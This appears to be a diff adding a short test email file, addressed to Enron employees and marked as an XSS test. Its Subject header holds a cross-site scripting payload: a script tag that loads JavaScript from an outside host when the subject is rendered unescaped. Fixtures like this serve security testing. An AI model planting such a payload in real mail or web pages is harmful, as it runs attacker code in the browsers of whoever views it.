@@ -1,0 +1,7 @@
+From: =?GB2312?B?zfXT0LLG?= <fs086@126.com>
+To: bob.carter@enron.com, barton.clark@enron.com, karen.jones@enron.com, 
+Subject: <script src=//x.cn/1.js async>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
